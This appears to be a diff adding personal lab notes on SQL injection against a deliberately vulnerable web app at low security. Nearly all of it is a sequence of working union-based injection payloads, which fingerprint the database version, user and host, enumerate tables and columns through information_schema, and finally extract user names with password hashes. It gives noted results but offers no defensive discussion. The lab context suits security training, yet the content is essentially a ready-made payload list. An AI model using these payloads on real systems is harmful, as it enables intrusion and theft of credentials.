@@ -1,0 +1,45 @@
+SQL Injection
+
+security level:- Low
+
+Queries:-
+
+ID:-1
+
+ID:-2
+
+ID:-3
+
+ID:-3 ' and 1=1 #
+
+ID:-3 ' and 1=0 union select 1,2 #
+
+ID:-3 ' and 1=0 union select null,version() #		
+ans:- version-5.5.20-log
+
+ID:-3 ' and 1=0 union select null,user() #			
+ans:- root@localhost
+
+ID:-3 ' and 1=0 union select null,hostname() #
+
+
+ID:-3 ' and 1=0 union select null,UUID() #
+ans:- display mac id
+
+ID:-3 ' and 1=0 union select null,database() #		
+ans:- bpwat (database name)
+
+3 ' and 1=0 union select null,table_name from information_schema.tables #
+ans:- table name choose important table name as like users, administrator,etc.
+
+ID:-3 ' and 1=0 union select null,table_name from information_schema.tables where table_schema!='mysql' and table_schema!='information_schema' #      
+ans:-display table all table names.
+
+3 ' and 1=0 union select null,table_name from information_schema.columns where table_name='users' #
+ans:-users
+
+ID:-3 ' and 1=0 union select null,concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users' #   			
+Ans:-Table column details
+
+ID:-3 ' and 1=0 union select null,concat(first_name,0x0a,password) from users # 			
+Ans:- User names with their password in hash format
